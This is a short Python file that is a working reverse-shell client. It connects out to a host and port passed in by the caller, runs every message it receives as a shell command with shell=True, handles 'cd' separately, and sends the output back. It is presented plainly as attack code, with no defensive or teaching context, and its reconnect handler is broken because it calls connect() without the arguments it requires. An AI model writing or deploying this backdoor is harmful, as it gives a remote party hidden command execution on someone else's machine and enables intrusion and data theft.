import socket
import subprocess
import os

def connect(payload_host, payload_port):
    s = socket.socket()
    host = payload_host
    port = payload_port

    while True:
        try:
            s.connect((host, port))

            while True:
                data = s.recv(102400)

                if data[:2].decode("utf-8") == 'cd':
                    os.chdir(data[3:].decode("utf-8"))

                if len(data) > 0:
                    cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    output_byte = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_byte,"utf-8")
                    currentWD = os.getcwd() + "> "
                    s.send(str.encode(output_str + currentWD))


        except Exception as error:
            connect()